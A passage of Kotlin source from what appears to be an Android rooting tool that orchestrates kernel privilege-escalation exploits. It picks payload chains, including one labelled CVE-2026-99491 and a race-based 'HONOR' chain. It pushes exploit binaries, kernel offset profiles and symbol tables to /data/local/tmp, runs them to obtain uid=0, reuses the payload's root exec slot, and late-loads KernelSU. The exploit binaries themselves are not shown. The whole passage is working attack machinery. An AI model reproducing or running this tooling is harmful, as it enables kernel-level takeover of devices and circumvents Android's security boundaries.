            // 9.408：不再按家族拦。99491 是全数据驱动的（偏移来自 profile、符号来自
            // ko-syms 表），同一份二进制在 5.10/5.15/6.1/6.6/6.12/6.18 乃至矩阵外的
            // 版本上都能跑；能不能拿到 uid=0 由真机决定，但不会在放行这一层停住。
            val wp = Payloads.wacomFor(fam)
            if (wp == null) {
                log("! wacom chain has no payload at all (asset missing)")
                return@withContext Outcome(false, "WACOM_UNSUPPORTED",
                    "CVE-2026-99491 payload asset is missing from the apk")
            }
            if (!Payloads.WACOM.containsKey(fam)) {
                log("· wacom: family=" + (if (fam.isEmpty()) "matrix-outside" else fam) +
                    " has no dedicated entry; using the shared 99491 payload: " + wp.name)
            }
            // 9.354：三种来源任一命中就放行 —— ① 9.354 起内置的 profile 库（我们离线从真镜像算的），
            // ② 用户自己在「标定」页从本机 boot.img 算出来存下的，③ 9.298 起的旧前缀名单（可执行文件编死常量）。
            val cal = GhostSupport.profileFor(env.kernel, WacomCalibrated.RELEASES)
            val builtin = WacomBuiltin.forKernel(env.kernel)
            val mined = WacomCalibStore.bytesFor(ctx, env.kernel) != null
            if (cal == null && builtin == null && !mined) {
                log("! wacom chain: this kernel has neither a built-in profile nor a calibrated one")
                log("  built-in: " + WacomBuiltin.releases().joinToString(","))
                log("  prefixes: " + WacomCalibrated.RELEASES.sorted().joinToString(","))
                log("  any kernel family can run this chain once calibrated — 标定 > 导入本机固件包,")
                log("  let it derive the 99491 offsets from this boot.img, then press 开始提权 again")
                return@withContext Outcome(false, "WACOM_UNMATCHED",
                    "CVE-2026-99491 needs a profile for this exact kernel; calibrate its boot.img first")
            }
            val src = when {
                mined -> "in-app calibration for " + env.kernel
                builtin != null -> "built-in profile for " + env.kernel
                else -> "calibrated for " + cal
            }
            log("· wacom payload: " + wp.name + " (" + src + "; single pass, stage runs as uid=0)")
            return@withContext runWacomChain(wp, env, mgrSafe, onStageUpdate)
        }
        // 9.282：ghost 链（一键root v1.6 / glpreload 同构）。它不按六支族矩阵走：
        // 常量是按 build 烧死的独立二进制，只在自己这一支上有。选它时优先于 fam，
        // 没有对应分支就直接报错回退，绝不拿别的链的二进制去顶（会 panic）。
        val wantsGhost = ctx.getSharedPreferences("backend", android.content.Context.MODE_PRIVATE)
            .getBoolean("useGhost", false)
        var ghostPayload = if (wantsGhost) Payloads.GHOST[ReleaseMatrix.familyOf(env.kernel) ?: ""] else null
        if (wantsGhost) {
            if (ghostPayload == null) {
                log("! ghost chain has no payload for family=" + (ReleaseMatrix.familyOf(env.kernel) ?: "?") +
                    " (built: " + Payloads.GHOST.keys.joinToString(",") + ")")
                return@withContext Outcome(false, "GHOST_UNSUPPORTED",
                    "ghost chain payload not built for this kernel family")
            }
            log("· ghost payload: " + ghostPayload.name + " (verbatim original bytes; runs its own embedded late-load first)")
        }
        // 9.288：ghost 链是**新增的一条独立链路**，只跑 payload/ghost/*-ghost。
        // 载荷是**原字节**（6,470,288 B 静态 ELF，自带 ksud + KMI 模块）：
        // 不再跑我们自己的 selftest、也不再按 GhostCalibrated 名单门禁 —— 原二进制自己判 build。
        // 调用形态一比一：cwd=/data/local/tmp、文件名 glpreload、零参数、实时输出进日志。
        // 跑完必须接着跑我们自己的 ksu_stage late-load；失败就报 GHOST_* / EXPLOIT，
        // 绝不回退去跑别的载荷（拿别的链顶 ghost 会写错 .data，panic_on_oops=1 整机重启）。
        if (ghostPayload != null) {
            return@withContext runGhostOriginal(ghostPayload!!, env, mgrSafe, onStageUpdate)
        }
        val pickedPayload = ghostPayload ?: famPayload ?: mode.target

        // 9.146：六支 payload 现在分属四条不同的利用链（见 ChainPlan）。
        // 链身份决定命令行参数：HONOR 必须拿到 bootflow.sh 那串 k=v，
        // 否则它按默认值跑（attempts=0 → 一个受害者都不起）。
        val chain = if (ghostPayload != null) Chain.GHOST else ChainPlan.ofRelease(env.kernel)
        val chainArgs = ChainPlan.argsFor(env.kernel, mode.args)
        log("· chain: " + chain.chainName + " (family " + (ReleaseMatrix.familyOf(env.kernel) ?: "out-of-matrix") + ")")

        // 9.135：deploy() 曾在重构里被漏掉，导致设备上一直是旧二进制（日志看不出变化）。
        // 每次执行前都核对/推送，payload 里的 build 标记也会把版本打到日志里。
        if (!deploy(listOf(pickedPayload))) {
            log("! payload deploy failed; aborted (avoid running stale binary)")
            return@withContext Outcome(false, "DEPLOY", "payload deploy failed (see log)")
        }

        // 9.269：perfprobe / honor.map / ko66.ko / insmod 全部退役 —— 六支 payload 现在
        // 都用同一套实现（fake cred + ksu_stage 里的管理器 ksud late-load），不再往设备
        // 推任何链外资产，也不再按族切命令行参数。
        //
        // 9.297：HONOR 链（5.10 / 5.15）是例外 —— 它按 target_exit=42 的 perf 受害者做
        // de_thread 竞态，符号全部来自外部 loadmap= 表，且不读 device.cfg。这一支必须把
        // 两样东西推上去：perfprobe（受害者，路径由 target= 给出）和 honor.map（我们现场
        // 生成的符号表，路径由 loadmap= 给出），并把参数还原成 bootflow.sh 那串 k=v。
        // 只对 HONOR 生效，别的族一个字节都不变。
        var honorArgs = chainArgs
        if (chain == Chain.HONOR) {
            if (!deploy(listOf(Payloads.PERFPROBE))) {
                log("! perfprobe deploy failed; aborted (HONOR chain needs a target_exit=42 victim)")
                return@withContext Outcome(false, "DEPLOY", "perfprobe deploy failed (see log)")
            }
            if (!deployHonorMap()) {
                log("! honor.map deploy failed; aborted (HONOR chain would run on builtin constants)")
                return@withContext Outcome(false, "DEPLOY", "honor.map deploy failed (see log)")
            }
            // 参数必须回到 bootflow.sh 那串 k=v：5.15 这支载荷自己解析 chain=/reapmax=/
            // target=/target_exit=/loadmap=，缺了 target 就不起受害者，缺了 loadmap 就退回
            // 编译期常量。ChainPlan.argsFor 自 9.269 起不再按族切，这里显式取回来。
            honorArgs = ChainPlan.honorArgs(WORK_DIR)
            log("· honor victim: " + Payloads.PERFPROBE.name + " / map: " + HonorMap.FILE)
        }

        // 9.157：预检不再用于「判断能不能跑」，但这一步必须保留 —— 它有副作用。
        // payload 的 trace_start 会把能挂的 tracefs 事件写 enable=1，而这个状态跨进程保留：
        // 9.155 的主链日志里就有 `[trace] /events/kmem/rss_stat: kmem_cache_alloc already armed`，
        // 说明上一轮 check 已经替主链挂好了。9.156 删掉 check 后主链要冷启动自己挂事件，
        // 本机 SELinux 把 8 个 direct enable 全拒（errno=13）挂不上，plant 之后的回收就落在
        // 没有被验证过的页上 -> panic。所以这里仍然先跑一次 check，但只写日志，不决定去留。
        // 注意：链在 6.6 内核上选的是分支 payload（ek-core-uid0-6.6），不是 UID0 本体。
        // ghost 链不需要这一步：它的 KASLR 走 perf callchain，不挂任何 tracefs 事件。
        if (ghostPayload == null && pickedPayload.name.startsWith("ek-core-uid0")) {
            // 9.297：5.15 支只认 --check，完成标记是 UAF-READY（不是 [check] READY）。
            // 传裸 "check" 会被当未知参数，脚本永远等不到 READY，白等 150 s。
            val warmArgs = if (chain == Chain.HONOR) honorArgs + " --check" else "check"
            val warmMarkers = if (chain == Chain.HONOR) listOf("UAF-READY") else listOf("[check] READY")
            onStageUpdate("warm ${pickedPayload.name} check")
            log("---- warm-up: ${pickedPayload.name} ${warmArgs.trim()} (arms tracefs events only) ----")
            val warm = stream(
                cmd = RunEnv.command(
                    WORK_DIR, pickedPayload.name, warmArgs, managerPkg, slideHex, pfnBaseHex, stageScript,
                ),
                markers = warmMarkers,
                timeoutSec = 150,
                persistOnSuccess = false,
                onStageUpdate = onStageUpdate,
            )
            log(if (warm.ok) "· warm-up done (${warm.marker}); running main chain"
                else "· warm-up not READY (${warm.reason}); continue main chain")
        }
        log("· manager pkg: ${mgrSafe ?: "unset (payload uses com.sukisu.ultra)"}")
        onStageUpdate("run ${pickedPayload.name} ${honorArgs.ifEmpty { "(default)" }}")
        log("---- main chain: ${pickedPayload.name} ${honorArgs} ----")
        val res = stream(
            cmd = RunEnv.command(
                WORK_DIR, pickedPayload.name, honorArgs, managerPkg, slideHex, pfnBaseHex, stageScript,
            ),
            markers = if (ghostPayload != null) listOf("[+] uid=0", "[ksu] handoff") else mode.successMarkers,
            timeoutSec = mode.timeoutSec,
            persistOnSuccess = mode.persists,
            onStageUpdate = onStageUpdate,
        )
        when {
            res.ok && mode.persists ->
                log("✓ success marker hit (${res.marker}). Process parked; do not kill, reboot to clean up.")
            res.ok -> log("✓ success marker hit (${res.marker})")
            res.parked -> log("! no root; payload parked (${res.reason})")
            res.timedOut -> log("! timeout (${mode.timeoutSec}s), no success marker")
            else -> log("! no success marker (${res.reason})")
        }

        onStageUpdate("verify result")
        var verify = verify()
        // 成功只认 root（su -c id / id / kernelsu 已加载）。
        // 标记只说明 payload 自己认为跑完了，不能当证据 ——
        // 之前 marker="kernelsu" 被 "kernelsu →（无）" 命中，直接把失败报成成功。
        var rooted = isRooted(verify)
        var tries = 0
        while (!rooted && tries < 4) {
            kotlinx.coroutines.delay(700)
            verify = verify()
            rooted = isRooted(verify)
            tries++
        }
        verify.forEach { log("  $it") }
        // su 不可用但「payload 自报 child uid=0 + kernelsu 已加载」时也算提权成功：
        // 那种情况是管理器还没给 shell 授权，不是 exploit 没成功（见 Verdict 的注释）。
        if (!rooted && Verdict.rooted(verify, res.marker, res.ok)) {
            rooted = true
            log("· su unauthorized, but cred changed and kernelsu loaded; counting as rooted")
        }
        if (res.ok && !rooted) log("! marker hit without root: fail (marker is not evidence)")

        // fatal（日志里出现内核异常特征）必须让整轮判失败，否则会误报成功。
        // fatal（内核异常特征）必须让整轮判失败，取 streaming 结果里的标志。
        val ok = !res.fatal && if (mode.persists) rooted else res.ok
        Outcome(
            ok = ok,
            stage = when {
                ok -> "DONE"
                res.parked -> "PARKED"
                else -> "EXPLOIT"
            },
            detail = buildString {
                if (res.ok) appendLine("marker: ${res.marker}" + if (rooted) "" else " (no root, not a success)")
                if (res.timedOut) appendLine("timeout: ${mode.timeoutSec}s")
                appendLine(Verdict.summary(verify, res.marker, res.ok) + if (rooted && !Verdict.suUid0(verify)) " (authorize su in the manager)" else "")
                if (mode.persists && res.ok) appendLine("note: parked process must not be killed; reboot to clean up.")
            },
            env = env,
            verify = verify,
        )
    }

    /**
     * 现在是否已经有 root（不是"能不能跑利用"，而是"su 是否已经可用"）。
     * 用于冷启动时把界面直接显示成"已提权"，而不是永远停在"就绪"。
     */
    suspend fun hasRootNow(): Boolean = withContext(Dispatchers.IO) {
        if (!Shell.connected() && !Shell.connect(ctx)) return@withContext false
        val (code, out) = Shell.exec("su -c id 2>&1")
        code == 0 && out.contains("uid=0")
    }

    /** KSU 模块是否真的加载了 —— 管理器能不能"接管"就看这个。 */
    suspend fun ksuModuleLoaded(): Boolean = withContext(Dispatchers.IO) {
        if (!Shell.connected() && !Shell.connect(ctx)) return@withContext true
        val (_, out) = Shell.exec("grep -c '^kernelsu ' /proc/modules 2>/dev/null")
        (out.trim().toIntOrNull() ?: 0) > 0
    }



    // ---------------------------------------------------------------- late-load / deploy helpers


    private fun isRooted(verify: List<String>): Boolean =
        verify.firstOrNull { it.startsWith("su \u2192") }?.contains("uid=0") == true

    private fun verify(): List<String> {
        val mods = one("grep kernelsu /proc/modules 2>&1")
        val rootSu = Shell.execRoot("id 2>&1")
        val oneShot = one("cat " + ROOT_UID_FILE + " 2>/dev/null") == "0"
        val su = when {
            rootSu.first == 0 && rootSu.second.contains("uid=0") -> rootSu.second.trim()
            rootSu.first != 255 && oneShot -> "uid=0 (payload root-cmd, one-shot)"
            rootSu.first == 255 -> ""
            else -> Shell.exec("su -c id 2>&1").second.trim()
        }
        val mgr = one("cat " + WORK_DIR + "/mgr_registered 2>/dev/null").ifEmpty { "(unregistered)" }
        val ks = mods.split(" ").filter { it.isNotBlank() }.take(3).joinToString(" ").ifEmpty { "(none)" }
        val suId = shortId(su).replace("\n", " ")
        return listOf(
            "id \u2192 " + shortId(one("id")).replace("\n", " "),
            "su \u2192 " + suId,
            "manager \u2192 " + mgr,
            "kernelsu -> " + ks,
            "getenforce \u2192 " + one("getenforce 2>&1"),
        )
    }

    private fun sha256Hex(bytes: ByteArray): String {
        val d = java.security.MessageDigest.getInstance("SHA-256").digest(bytes)
        val sb = StringBuilder(d.size * 2)
        for (b in d) sb.append("%02x".format(b))
        return sb.toString()
    }

    private fun stageEnv(
        mgr: String,
        mgrUid: Int?,
        fallback: Boolean,
        probeOnly: Boolean,
        registerOnly: Boolean,
    ): String = "EXTRACTKIT_MGR=" + mgr +
        (mgrUid?.let { " EXTRACTKIT_MGR_UID=" + it } ?: "") +
        " EXTRACTKIT_DRYRUN=0 EXTRACTKIT_REGISTER_ONLY=" + (if (registerOnly) "1" else "0") +
        (if (fallback) " EXTRACTKIT_KSUD_FALLBACK=payload" else "") +
        (if (probeOnly) " EXTRACTKIT_PROBE_ONLY=1" else "")

    private fun appVersion(): String = runCatching {
        val pi = ctx.packageManager.getPackageInfo(ctx.packageName, 0)
        val code = if (android.os.Build.VERSION.SDK_INT >= 28) pi.longVersionCode else pi.versionCode.toLong()
        pi.versionName + " (code=" + code + ")"
    }.getOrNull() ?: "?"

    private fun managerUid(pkg: String?): Int? = pkg?.let {
        runCatching { ctx.packageManager.getApplicationInfo(it, 0).uid }.getOrNull()
    }

    private fun managerState(mgr: String, reg: String, params: List<String>, uid: Int, exit: String?): String =
        ManagerVerdict.of(mgr, reg, params, uid, exit)

    /** 9.289: what the module actually believes, so a wrong uid is visible in the log. */
    private fun ksuParams(): List<String> {
        val cached = one("cat " + KSU_PARAMS_FILE + " 2>/dev/null")
        if (cached.isNotBlank()) return cached.lineSequence().filter { it.isNotBlank() }.toList()
        val live = one(
            "for f in /sys/module/kernelsu/parameters/* /sys/module/ksu/parameters/*; do " +
                "[ -f \"\$f\" ] && echo \"\$(basename \$f)=\$(cat \$f 2>&1)\"; done 2>/dev/null | head -n 40",
        )
        if (live.isBlank()) return listOf("(no parameters dir: /sys/module/kernelsu/parameters)")
        return live.lineSequence().filter { it.isNotBlank() }.toList()
    }

    private fun diagRootChannels() {
        val out = Shell.exec(
            "ls -l /data/local/tmp 2>&1 | head -n 40; " +
                "echo '-- extract-kit --'; ls -l /data/local/tmp/extract-kit 2>&1 | head -n 30; " +
                "echo '-- unix sockets --'; grep -i -E 'su|ksu' /proc/net/unix 2>/dev/null | head -n 20; " +
                "echo '-- procs --'; ps -A -o PID,USER,ARGS 2>/dev/null | grep -i -E 'glpreload|ksud| temp_su' | head -n 20",
        ).second
        out.lineSequence().filter { it.isNotBlank() }.forEach { log("  [diag] " + it) }
    }


    private fun verifyBytes(path: String, wantSize: Int, wantSha: String): Boolean {
        val out = Shell.exec("wc -c < " + path + " 2>/dev/null; sha256sum " + path + " 2>/dev/null").second
        val lines = out.lineSequence().toList()
        val size = lines.getOrNull(0)?.trim()?.takeWhile { it.isDigit() }?.toIntOrNull() ?: -1
        val sha = lines.getOrNull(1)?.trim()?.substringBefore(' ').orEmpty()
        log("\u00b7 " + path + ": size=" + size + " sha256=" + sha)
        return size == wantSize && sha.equals(wantSha, ignoreCase = true)
    }

    private fun assetBytes(asset: String): ByteArray? =
        runCatching { ctx.assets.open(asset).use { it.readBytes() } }.getOrNull()


    private fun pushAssetWithFallback(asset: String, wantSize: Int, wantSha: String, dest: String): String? {
        val bytes = assetBytes(asset)
        if (bytes == null) {
            log("! asset missing: assets/" + asset)
            return null
        }
        if (bytes.size != wantSize || !sha256Hex(bytes).equals(wantSha, ignoreCase = true)) {
            log("! asset mismatch: size=" + bytes.size + " sha256=" + sha256Hex(bytes) + " (want " + wantSize + " / " + wantSha + ")")
            return null
        }
        Shell.exec("rm -f " + dest)
        val pushed = Shell.pushFile(dest, bytes, executable = false)
        if (pushed.first == 0 && verifyBytes(dest, wantSize, wantSha)) return dest
        log("\u00b7 " + dest + ": binder push unusable (rc=" + pushed.first + ", " + pushed.second.trim() + "); one base64 write")
        val b64 = android.util.Base64.encodeToString(bytes, android.util.Base64.NO_WRAP)
        Shell.exec("echo '" + b64 + "' | base64 -d > " + dest + " 2>/dev/null")
        if (verifyBytes(dest, wantSize, wantSha)) return dest
        log("! " + dest + ": base64 write failed too")
        return null
    }

    private fun pushProfileBytes(dest: String, bytes: ByteArray): String? {
        val want = sha256Hex(bytes)
        Shell.exec("rm -f " + dest)
        val pushed = Shell.pushFile(dest, bytes, executable = false)
        if (pushed.first == 0) {
            val size = one("wc -c < " + dest + " 2>/dev/null").takeWhile { it.isDigit() }
            val sha = one("sha256sum " + dest + " 2>/dev/null").substringBefore(' ')
            if (size == bytes.size.toString() && sha.equals(want, ignoreCase = true)) return dest
            log("! push verify failed on " + dest + " (size=" + size + " sha256=" + sha + ")")
        } else {
            log("! push failed (" + dest + "): " + pushed.second.trim())
        }
        val b64 = android.util.Base64.encodeToString(bytes, android.util.Base64.NO_WRAP)
        for (p in listOf(dest, FALLBACK_PROFILE_PATH)) {
            val dir = p.substringBeforeLast('/')
            Shell.exec("mkdir -p " + dir + " 2>/dev/null; chmod 0777 " + dir + " 2>/dev/null; rm -f " + p + " 2>/dev/null")
            Shell.exec("echo " + b64 + " | base64 -d > " + p + " 2>/dev/null; echo rc=\$?")
            val size = one("wc -c < " + p + " 2>/dev/null").takeWhile { it.isDigit() }
            val sha = one("sha256sum " + p + " 2>/dev/null").substringBefore(' ')
            log("\u00b7 profile via base64 -> " + p + ": size=" + size + " sha256=" + sha)
            if (size == bytes.size.toString() && sha.equals(want, ignoreCase = true)) return p
        }
        return null
    }

    /** 9.404: the same verify-then-base64 fallback as pushProfileBytes, for non-profile payloads. */
    private fun pushBytesVerified(dest: String, bytes: ByteArray): String? {
        val want = sha256Hex(bytes)
        Shell.exec("rm -f " + dest)
        val pushed = Shell.pushFile(dest, bytes, executable = false)
        if (pushed.first == 0) {
            val size = one("wc -c < " + dest + " 2>/dev/null").takeWhile { it.isDigit() }
            val sha = one("sha256sum " + dest + " 2>/dev/null").substringBefore(' ')
            if (size == bytes.size.toString() && sha.equals(want, ignoreCase = true)) return dest
            log("! push verify failed on " + dest + " (size=" + size + " sha256=" + sha + ")")
        } else {
            log("! push failed (" + dest + "): " + pushed.second.trim())
        }
        val b64 = android.util.Base64.encodeToString(bytes, android.util.Base64.NO_WRAP)
        Shell.exec("mkdir -p " + dest.substringBeforeLast('/') + " 2>/dev/null; rm -f " + dest + " 2>/dev/null")
        Shell.exec("echo " + b64 + " | base64 -d > " + dest + " 2>/dev/null; echo rc=\$?")
        val size = one("wc -c < " + dest + " 2>/dev/null").takeWhile { it.isDigit() }
        val sha = one("sha256sum " + dest + " 2>/dev/null").substringBefore(' ')
        log("\u00b7 push via base64 -> " + dest + ": size=" + size + " sha256=" + sha)
        return if (size == bytes.size.toString() && sha.equals(want, ignoreCase = true)) dest else null
    }

    private fun pushAndVerify(dest: String, finalPath: String, bytes: ByteArray, want: String): Boolean {
        Shell.exec("rm -f " + dest)
        val pushed = Shell.pushFile(dest, bytes, executable = true)
        log("\u00b7 wacom push step (" + dest + "): " + (Shell.lastPushInfo ?: "?"))
        if (pushed.first != 0) {
            log("! wacom push failed (" + dest + "): " + pushed.second.trim())
            Shell.lastExecErrorText()?.let { log("  [err] " + it.replace("\n", " ")) }
            return false
        }
        Shell.exec("chmod 755 " + dest)
        if (dest != finalPath) Shell.exec("mv -f " + dest + " " + finalPath + " 2>&1")
        val size = one("wc -c < " + finalPath + " 2>/dev/null").takeWhile { it.isDigit() }
        val sha = one("sha256sum " + finalPath + " 2>/dev/null").substringBefore(' ')
        log("\u00b7 pushed " + finalPath + ": size=" + size + " sha256=" + sha)
        if (size != WACOM_SIZE.toString() || !sha.equals(want, ignoreCase = true)) {
            log("! device copy differs from the pinned bytes (want " + WACOM_SIZE + " B / " + want + "); aborted before executing anything")
            return false
        }
        return true
    }

    /** 部署完 wacom 载荷后把设备上的落地情况打出来（路径/权限/存储/id/getenforce）。 */
    private fun probeWacomPath() {
        val out = Shell.exec(
            "ls -ld /data/local/tmp/eksu.bin 2>&1; ls -l /data/local/tmp/eksu* 2>&1 | head -6; " +
                "df -h /data/local/tmp 2>&1 | tail -1; id 2>&1; getenforce 2>&1",
        ).second
        if (out.isBlank()) {
            log("  [probe] (no output; the shell itself is gone)")
            return
        }
        out.lineSequence().filter { it.isNotBlank() }.forEach { log("  [probe] " + it) }
    }

    private fun deployWacomBinary(bytes: ByteArray, want: String): Boolean {
        if (pushAndVerify(WACOM_PATH, WACOM_PATH, bytes, want)) return true
        log("\u00b7 wacom deploy: direct write failed; retrying through a staged copy")
        probeWacomPath()
        if (pushAndVerify(WACOM_PATH + ".new", WACOM_PATH, bytes, want)) return true
        log("! WACOM_DEPLOY: direct write and staged write both failed")
        return false
    }

    private fun assetText(asset: String): String? = assetBytes(asset)?.let { String(it, Charsets.UTF_8) }

    /**
     * 9.439: every manager ships the ksud cli under its own .so name (SukiSU Nova hides it in
     * libmyybwmrufk.so, older builds use libksud.so), so neither the name nor the size proves
     * anything. Score every candidate by its ksud traits and take the winner.
     */
    private val CLI_MARKERS = arrayOf(
        "userspace/ksud/src/cli.rs",
        "KernelSU userspace cli",
        "late-load command triggered!",
        "No embedded KernelSU module for KMI",
        "--post-magica",
        "--package-name"
    )

    /** 0 = not the ksud cli; >=1000 = the binary prints the ksud banner for -V. */
    private fun scoreManagerLib(file: String): Pair<Int, String> {
        val probe = one(file + " -V 2>&1 | head -3")
        var score = 0
        if (probe.contains("uapi")) score += 1000
        if (probe.contains("KernelSU")) score += 400
        val args = CLI_MARKERS.joinToString(" ") { "-e '" + it + "'" }
        val hits = one("grep -a -c -F " + args + " " + file + " 2>/dev/null")
            .trim().takeWhile { it.isDigit() }.toIntOrNull() ?: 0
        score += hits * 10
        val ver = probe.lineSequence().firstOrNull { it.isNotBlank() }.orEmpty().trim()
        return score to ver
    }

    private fun patchProfileText(text: String, mgr: String): ByteArray? {
        val pathOut = one("pm path " + mgr + " 2>/dev/null")
        val apk = pathOut.lineSequence().map { it.trim() }.firstOrNull { it.startsWith("package:") }?.removePrefix("package:")
        if (apk.isNullOrBlank()) {
            log("· profile: pm path " + mgr + " gave nothing; keeping libksud.so")
            return null
        }
        val libDir = apk.substringBeforeLast('/') + "/lib"
        for (abi in listOf("arm64", "arm64-v8a")) {
            val ls = one("ls -l " + libDir + "/" + abi + " 2>/dev/null")
            val cands = ls.lineSequence().mapNotNull { line ->
                val parts = line.trim().split(Regex("\\s+"))
                if (parts.size < 5) return@mapNotNull null
                val name = parts.last()
                if (!name.endsWith(".so")) return@mapNotNull null
                val size = parts.getOrNull(4)?.toLongOrNull() ?: return@mapNotNull null
                if (size <= 0) null else (name to size)
            }.distinctBy { it.first }.sortedByDescending { it.second }.toList()
            if (cands.isEmpty()) continue
            var chosen: String? = null
            var chosenScore = -1
            var chosenSize = 0L
            var ver = ""
            for (cand in cands) {
                val (score, banner) = scoreManagerLib(libDir + "/" + abi + "/" + cand.first)
                if (score > 0) log("· profile: " + abi + "/" + cand.first + " score=" + score + " size=" + cand.second)
                if (score > chosenScore || (score == chosenScore && cand.second > chosenSize)) {
                    chosen = cand.first
                    chosenScore = score
                    chosenSize = cand.second
                    ver = banner
                }
            }
            if (chosen == null) continue
            if (chosenScore <= 0) {
                log("· profile: no .so under " + libDir + "/" + abi + " reads like the ksud cli; taking the largest (" + chosen + ")")
            }
            if (mgrCliPath == null) mgrCliPath = libDir + "/" + abi + "/" + chosen
            if (chosen == "libksud.so") continue
            val needle = "lib/" + abi + "/libksud.so"
            if (!text.contains(needle)) continue
            val patched = text.replace(needle, "lib/" + abi + "/" + chosen)
            log("· profile: manager lib " + abi + " -> " + chosen + " [" + ver + "] score=" + chosenScore)
            return patched.toByteArray(Charsets.UTF_8)
        }
        log("· profile: no .so under " + libDir + "; keeping libksud.so")
        return null
    }



    /** 9.331: the chain wants <workdir>/wacom.profile plus <workdir>/ko-syms-<release>.txt. */
    private fun deployProfile(dir: String, kernel: String, mgr: String): String? {
        val base = profileTextFor(kernel)
        if (base == null) {
            log("! PROFILE_DEPLOY: no profile for " + kernel)
            return null
        }
        val patched = patchProfileText(base, mgr)
        val bytes = patched ?: base.toByteArray(Charsets.UTF_8)
        val prof = pushProfileBytes(dir + "/wacom.profile", bytes)
        if (prof == null) {
            log("! PROFILE_DEPLOY: wacom.profile could not be pushed")
            return null
        }
        if (deploySyms(dir, kernel) == null) {
            log("! SYMS_DEPLOY: ko-syms could not be pushed")
            return null
        }
        return prof
    }

    /** 9.402: calibrated bytes win, then the built-in table, then the packaged asset (release-gated). */
    private fun profileTextFor(kernel: String): String? {
        val cal = WacomCalibStore.bytesFor(ctx, kernel)
        if (cal != null && cal.isNotEmpty()) {
            log("\u00b7 profile: in-app calibration (" + cal.size + " B) for " + kernel)
            return String(cal, Charsets.UTF_8)
        }
        val e = WacomBuiltin.forKernel(kernel)
        if (e != null) {
            val b = WacomBuiltin.bytes(ctx, e)
            if (b != null && b.isNotEmpty()) {
                log("\u00b7 profile: built-in (" + b.size + " B) for " + kernel)
                return String(b, Charsets.UTF_8)
            }
            log("! profile: built-in entry for " + kernel + " could not be read")
        }
        val a = assetText(PROFILE_ASSET)
        if (a != null && a.contains(kernel)) {
            log("\u00b7 profile: packaged asset (" + PROFILE_SIZE + " B) for " + kernel)
            return a
        }
        if (a != null) log("! profile: packaged asset declares another release; " + kernel + " has none")
        return null
    }

    /** 9.402: the ko_patch table must match the release inside its own header (validate_syms_header). */
    private fun deploySyms(dir: String, kernel: String): String? {
        // 9.403: one table per release; the header inside each file must equal the running release.
        // 9.404: a table calibration derived from this boot.img wins over the packaged ones.
        val named = dir + "/ko-syms-" + kernel + ".txt"
        val mined = WacomCalibStore.symsFor(ctx, kernel)
        if (mined != null) {
            val p = pushBytesVerified(named, mined)
            if (p != null) {
                pushBytesVerified(dir + "/ko-syms.txt", mined)
                log("\u00b7 syms: in-app calibration (" + mined.size + " B) -> " + named)
                return p
            }
            log("! syms: calibrated table could not be pushed; falling back to the packaged tables")
        }
        // 9.406: the payload's header check compares version + g<hash> only, so a table built for
        // one stamp of a kernel also covers that image rebuilt under another -abogkiNNN stamp.
        val alt = symsTableFor(kernel) ?: Triple(SYMS_ASSET, SYMS_SIZE, SYMS_SHA)
        val pushed = pushAssetWithFallback(alt.first, alt.second, alt.third, named)
        if (pushed == null) return null
        // keep a release-agnostic copy for older payloads and manual runs
        pushAssetWithFallback(alt.first, alt.second, alt.third, dir + "/ko-syms.txt")
        log("\u00b7 syms: " + alt.first + " (" + alt.second + " B) -> " + named)
        return pushed
    }

    /** 9.406: the table that covers this release, or null when we ship none. */
    private fun symsTableFor(kernel: String): Triple<String, Int, String>? =
        SYMS_BY_RELEASE.entries.firstOrNull { RelMatch.same(it.key, kernel) }?.value
    // ---------------------------------------------------------------- late-load tail

    /**
     * 9.2xx: the late-load half of every chain.
     *
     * Judgement stays single: after the run /proc/modules must carry kernelsu. The log carries
     * three pieces of evidence - the pushed script, the entry state, and the result line.
     * 9.292: when the payload leaves no su client, borrow its uid=0 exec slot (PPG_ROOT_CMD).
     * 9.298: externalStage=true means the stage already ran as uid=0 inside the payload child;
     *        here we only collect evidence and judge, we do not re-run (a re-run overwrites it).
     */
    private suspend fun lateLoadTail(
        managerPkg: String?,
        payloadOk: Boolean = false,
        externalStage: Boolean = false,
    ): Boolean {
        var script: String? = if (ManagerAudit.deploy(ctx)) ManagerAudit.SCRIPT else null
        if (script == null) {
            log("! late-load script push failed; retrying once")
            script = if (ManagerAudit.deploy(ctx)) ManagerAudit.SCRIPT else null
        }
        if (script == null) {
            log("! LATE_LOAD_SCRIPT_MISSING: assets/stage/ksu_stage.sh could not be pushed")
            return false
        }
        val stage = script
        log("late-load script: " + stage)
        val scriptSha = one("sha256sum " + stage + " 2>/dev/null | cut -c1-8")
        log("\u00b7 build: " + appVersion() + " stage=" + scriptSha)
        val before = one("grep -c '^kernelsu ' /proc/modules 2>/dev/null").toIntOrNull() ?: 0
        val mgr = managerPkg ?: "com.sukisu.ultra"
        val mgrUid = managerUid(mgr)
        log(
            "\u00b7 late-load entry: uid=" + one("id -u") +
                " kernelsu_before=" + before + " mgr=" + mgr + "/" + (mgrUid?.toString() ?: "?"),
        )
        var root = if (externalStage) null else Shell.probeRoot()
        log(
            "\u00b7 root channel: " + when {
                externalStage -> "external (stage ran as uid=0 inside the payload child; no resident su)"
                root != null -> root!!
                else -> "none (no payload su found)"
            },
        )
        var stageRanByRootCmd = externalStage
        if (root == null && payloadOk && !externalStage) {
            log("\u00b7 root channel: absent after payload; payload leaves a unix socket, not a su client")
            diagRootChannels()
            Shell.exec("rm -f " + KSU_STAGE_OUT + " " + ROOT_UID_FILE)
            log("\u00b7 root-cmd: reuse the payload's own uid=0 exec slot (same bytes, same 0-arg call, only PPG_ROOT_CMD set)")
            val rcr = stream(
                cmd = rootCmdRunCmd(stage, mgr, mgrUid, WORK_DIR),
                markers = listOf("[root] exec cmd len="),
                timeoutSec = 180,
                persistOnSuccess = false,
            )
            log(
                "\u00b7 root-cmd run: " + when {
                    rcr.ok -> "marker " + rcr.marker
                    rcr.timedOut -> "timeout (180s)"
                    else -> "no marker (" + rcr.reason + ")"
                },
            )
            one("tail -n 60 " + WORK_DIR + "/rootcmd.log 2>/dev/null")
                .lineSequence().filter { it.isNotBlank() }.forEach { log("  [rootcmd] " + it) }
            stageRanByRootCmd = Shell
                .exec("grep -q 'invoked-as uid=0' " + KSU_STAGE_OUT + " 2>/dev/null; echo RC=\$?")
                .second.contains("RC=0")
            if (stageRanByRootCmd) {
                log("\u00b7 root-cmd run: stage executed as uid=0 (the stage's own uid line is the proof, not the payload log)")
            }
            root = Shell.probeRoot(force = true)
            log("\u00b7 root channel after root-cmd: " + (root ?: "none (one-shot exec slot only)"))
        }
        val registerOnly = before > 0
